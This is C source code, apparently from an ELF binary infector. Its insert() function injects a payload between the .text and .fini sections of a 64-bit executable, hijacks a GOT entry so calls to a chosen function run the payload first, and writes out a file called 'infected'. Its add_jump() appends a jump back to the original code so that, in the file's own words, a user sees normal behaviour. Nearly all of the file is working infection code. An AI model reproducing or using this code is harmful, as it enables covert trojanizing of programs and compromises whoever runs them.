#include <stdint.h>
#include <elf.h>
#include <stdlib.h>
#include <log.h>
#include <string.h>

#include "elf-parser.h"
#include "utils.h"
#include "insertion.h"

#define JUMP_SIZE 5
#define LIB_CSU_SIZE 5

/**
 * insert(): Insert the payload in the target binary
 * @dest: Binary to infect
 * @src: Payload to inject in the binary
 * @dest_size: Size of the target binary
 * @src_size: Size of the payload
 *
 * Insert a bytecode between the .text section and the .fini section
 */
void insert(byte *dest, byte *src, uint64_t dest_size, uint16_t src_size, char *target_function) {

    byte *final_product = NULL;
    Elf64_Phdr *seg = get_exe_segment();
    Elf64_Addr old_entry;

    /* First we find the section .text */
    Elf64_Shdr *text = get_section_by_name(".text");
    if (text == NULL) {
        ERROR("Can't find the section .text", NULL);
    }

    Elf64_Addr new_entry = text->sh_addr + text->sh_size;
    old_entry = change_got(new_entry, target_function);
    add_jump(&src, &src_size, new_entry, old_entry);

    /* Then we find the segment that contains the text section */
    for (; seg != NULL; seg = get_exe_segment()) {
        if (section_in_segment(text, seg)) {
            break;
        }
    }

    update_symbol("_fini", src_size);
    update_section(".fini", src_size);
    update_dynsym(DT_FINI, src_size);

    /* Now we update the size of this segment/section */
    text->sh_size += src_size;
    seg->p_filesz += src_size;
    seg->p_memsz  += src_size;

    /* We allocate a new buffer for the new executable */
    final_product = calloc(dest_size + src_size, sizeof(byte));
    SUCCESS("Allocation of 0x%lx bytes", dest_size + src_size);

    /* We fill this new binary buffer */
    /* First we fill the content until we arrive to the place of the code we add */
    uint64_t i = 0;
    uint64_t j = 0;
    SUCCESS("Write the first 0x%lx bytes", text->sh_offset + text->sh_size - src_size);
    for (; i < text->sh_offset + text->sh_size - src_size; i++) {
        final_product[i] = dest[i];
    }

    /* Then we insert the payload */
    for (; j < src_size; j++) {
	    final_product[i + j] = src[j];
    }
    for (; i < seg->p_offset + seg->p_filesz; i++) {
	    final_product[i + j] = dest[i];
    }

    /* Finally we finish we the rest of the target content */
    for (i = ((seg->p_offset + seg->p_filesz) & (-1 ^ (PAGE_SIZE - 1))) + PAGE_SIZE; i < dest_size; i++) {
	    final_product[i] = dest[i];
    }
    write_file("infected", final_product, dest_size + src_size);

    free(final_product);
    free(src);
}

/**
 * add_jump(): Add a jump instruction at the end of the payload to retrieve a normal workflow for the user
 * @{name}: Pointer to the adress of the payload
 * @size: Payload size pointer
 * @new_entry: New entry point of the function
 * @old_entry: Old entry where we have to jump
 *
 * Add a x86_64 unconditionnal jump to the end of the payload.
 * It allows to have a normal behaviour for a standard user.
 */
void add_jump(byte **payload_addr, uint16_t *size, Elf64_Addr new_entry, Elf64_Addr old_entry) {

    /* We setup the offset */
    int32_t offset = old_entry - (new_entry + *size + JUMP_SIZE);
    byte *new_dest = calloc(*size + JUMP_SIZE, sizeof(byte));

    /* We copy the original payload into a new buffer */
    memcpy(new_dest, *payload_addr, *size);

    /* Now we add the jump instruction */
    new_dest[*size] = 0xe9;
    memcpy(new_dest + *size + 1, &offset, sizeof(int32_t));

    /* We free the old buffer */
    free(*payload_addr);

    /* We setup the new values for the payload */
    *payload_addr = new_dest;
    *size = *size + JUMP_SIZE;
}
